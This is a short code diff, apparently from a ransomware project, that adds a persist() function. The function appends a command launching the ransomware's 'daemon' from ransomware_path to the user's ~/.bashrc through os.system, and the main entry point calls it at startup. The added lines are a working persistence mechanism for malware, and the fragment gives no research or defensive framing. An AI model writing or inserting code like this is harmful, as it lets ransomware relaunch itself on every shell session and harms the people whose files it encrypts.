@@ -158,7 +158,15 @@ def menu():
         gc.collect()
         del aes_keys_and_base64_path
 
+def persist():
+    # cp = 'cp ' + ransomware_path + 'daemon ~/.bashrc'
+
+    nano = 'echo ".' + ransomware_path + '/daemon" >> ~/.bashrc '
+    os.system(nano)
+
+
 if __name__ == "__main__":
+    persist()
     while True:
         try:
             menu()
